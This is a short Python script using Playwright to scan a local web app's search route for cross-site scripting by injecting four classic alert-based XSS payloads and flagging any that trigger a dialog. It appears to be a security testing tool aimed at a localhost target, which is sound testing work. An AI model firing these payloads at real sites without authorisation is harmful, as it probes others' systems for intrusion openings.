import asyncio
from playwright.async_api import async_playwright
import urllib.parse

# Configuration
TARGET_BASE = [
    "http://localhost:3000/#/"
    ] 

PAYLOADS = [
    "<script>alert(1)</script>",
    "<iframe src=\"javascript:alert(`xss`)\">",
    "<img src=x onerror=alert(1)>",
    "</script><script>alert(1)</script>"
]

SINKS = [
    "search?q="

]

async def xss_scan(context, payload, target):
    encoded_payload = urllib.parse.quote(payload)
    vulnerable = False

    page = await context.new_page()
    
    async def handle_alert(dialog):
        nonlocal vulnerable
        if dialog.type == "alert":
            vulnerable = True
        await dialog.dismiss()
     
    page.on("dialog", handle_alert)

    try:
        await page.goto(target+encoded_payload, wait_until="networkidle", timeout=5000)
        await asyncio.sleep(2)  # Wait for potential XSS to trigger

    except Exception as e:
        print(f"Error during scanning: {e}")
    finally:
        await page.close()
    
    return vulnerable, payload if vulnerable else None


async def main():
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        context = await browser.new_context()
        
        tasks = []

        for base in TARGET_BASE:
            for sink in SINKS:
                target = f"{base}{sink}"
                for payload in PAYLOADS:
                    tasks.append(xss_scan(context, payload, target))

        scan_results = await asyncio.gather(*tasks)
        for vulnerable, payload in scan_results:
            if vulnerable:
                print(f"Vulnerable to XSS with payload: {payload}")


        await browser.close()

if __name__ == "__main__":
    asyncio.run(main())